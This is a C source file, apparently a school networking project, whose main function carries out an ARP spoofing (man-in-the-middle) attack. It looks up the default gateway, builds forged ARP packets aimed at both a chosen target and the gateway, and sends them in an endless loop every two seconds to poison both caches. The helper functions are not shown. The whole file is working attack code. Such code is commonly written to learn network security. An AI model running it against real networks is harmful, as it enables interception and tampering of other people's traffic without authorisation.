#include <42_arp.h>


int main(int ac, char **av)
{
    t_arp_packet		arp_packet_to_target;
	t_arp_packet		arp_packet_to_gateway;
	int					attacking;
	char				*gateway_ip;
	char				*gateway_mac;
	char				*interface;

	attacking = true;
	interface = "eth0";
	if (ac != 5){
		print_error("Please enter the Ip source, the Mac source, the target Ip source, The Mac source.\n -> Examples :192.168.10.45, aa.bb.cc.dd.ee.ff, 192.168.10.47, a0.b0.c0.d0.e0.f0\n");
	}
    
	is_valid_ip_addr(av[1]);
	is_valid_ip_addr(av[3]);
	is_valid_mac_addr(av[2]);
	is_valid_mac_addr(av[4]);

	memset(&arp_packet_to_target, 0, sizeof(t_arp_packet));
	memset(&arp_packet_to_gateway, 0, sizeof(t_arp_packet));

	gateway_ip = get_default_gateway_ip(interface);
	if (gateway_ip == NULL )
	{
		return(-1);
	}
	gateway_mac = get_default_gateway_mac(gateway_ip);
	if (gateway_mac == NULL)
	{
		return (-1);
	}
	fill_packet(&arp_packet_to_target, gateway_ip, av[2], av[3], av[4]);
	fill_packet(&arp_packet_to_gateway, av[3], av[2], gateway_ip, gateway_mac);
	print_packet_info(&arp_packet_to_target);
	print_packet_info(&arp_packet_to_gateway);

	dump_packet_hex(&arp_packet_to_target);
	dump_packet_hex(&arp_packet_to_gateway);

	
	while (attacking)
	{
		pcap_send_packet(&arp_packet_to_target);
		pcap_send_packet(&arp_packet_to_gateway);
		sleep(2);
		
	}
	free(gateway_mac);
	return (0);
}
